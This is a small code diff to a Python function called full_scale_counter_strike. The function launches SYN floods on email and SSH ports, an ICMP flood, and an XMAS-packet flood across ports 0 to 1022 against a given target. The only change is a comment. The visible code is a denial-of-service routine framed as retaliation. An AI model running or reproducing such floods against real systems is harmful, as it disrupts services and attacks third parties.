@@ -10,7 +10,7 @@ def full_scale_counter_strike(target):
     counter_strike_helper.synflood(target, 143, 200) # Email
     counter_strike_helper.synflood(target, 993, 200) # Email
     counter_strike_helper.synflood(target, 22, 200) # SSH
-    counter_strike_helper.icmpflood(target,200)
+    counter_strike_helper.icmpflood(target,200) # ICMP
     for port in range(0,1023): # xmas flood
         counter_strike_helper.xmasflood(target,port,50)
 
